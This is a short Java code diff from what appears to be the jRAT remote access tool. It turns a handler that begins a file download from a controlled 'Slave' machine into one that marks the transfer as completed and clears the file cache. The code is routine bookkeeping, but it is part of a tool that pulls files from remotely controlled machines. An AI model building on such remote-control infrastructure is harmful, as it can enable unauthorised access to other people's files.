@@ -1,25 +1,21 @@
-package jrat.module.fs.packets;
+package jrat.module.fs.packets.download;
 
 import jrat.common.io.FileCache;
 import jrat.common.io.TransferData;
+import jrat.common.io.TransferData.State;
 import jrat.controller.Slave;
 import jrat.controller.packets.incoming.IncomingPacket;
 
 
-public class Packet30BeginServerDownload implements IncomingPacket {
+public class Packet31CompleteDownload implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
 		String file = slave.readLine();
-		long length = slave.readLong();
 		
 		TransferData data = FileCache.get(file);
-
-		if (data != null) {
-			data.setRemoteFile(file);
-			data.setTotal(length);
-			data.setObject(slave);
-		}
+		data.setState(State.COMPLETED);
+		FileCache.clear(file);
 	}
 
 }
